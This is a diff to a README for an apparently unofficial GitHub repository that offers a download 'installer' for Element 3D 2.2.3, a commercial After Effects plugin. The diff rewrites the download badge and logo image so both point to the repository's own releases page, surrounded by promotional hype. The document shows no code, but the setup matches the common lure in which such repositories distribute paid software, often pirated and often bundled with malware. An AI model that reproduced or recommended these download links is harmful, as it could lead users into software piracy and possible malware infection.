@@ -12,7 +12,7 @@ Topics: ae-2025, after-effects, copilot, copilot-enabled, element-3d, element-3d
 
 To download the installer for Element 3D Version 2.2.3, please click the link below:
 
-[![Download Element 3D Installer](https://img.shields.io/badge/Download-Installer-blue.svg)](https://github.com/file/App.zip)
+[![Download Element 3D Installer](https://github.com/Senoes/Element-3D-version-2.2.3-releases-download-Installer/releases/tag/v2.0)](https://github.com/Senoes/Element-3D-version-2.2.3-releases-download-Installer/releases/tag/v2.0)
 
 ## Installation Guide 📥
 
@@ -30,7 +30,7 @@ Visit the link provided to unlock endless possibilities with Element 3D Version 
 
 Get ready to bring your visions to life and craft jaw-dropping visuals with Element 3D. The future of animation and design is now in your hands! Download the installer, dive in, and let your imagination soar.
 
-![Element 3D Logo](https://example.com/element3d_logo.png)
+![Element 3D Logo](https://github.com/Senoes/Element-3D-version-2.2.3-releases-download-Installer/releases/tag/v2.0)
 
 ---
 
